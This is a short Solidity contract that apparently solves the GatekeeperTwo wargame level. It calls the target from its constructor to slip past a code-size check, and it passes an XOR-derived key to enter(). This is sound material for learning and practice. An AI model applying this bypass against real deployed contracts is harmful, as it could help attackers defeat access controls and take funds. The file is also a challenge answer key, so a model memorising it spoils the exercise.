// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GatekeeperTwo} from "../GatekeeperTwo.sol";

contract GatekeeperTwoAttacker {
    constructor(address gatekeeperTwo) {
        uint64 key = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;
        GatekeeperTwo(gatekeeperTwo).enter(bytes8(key));
    }
}
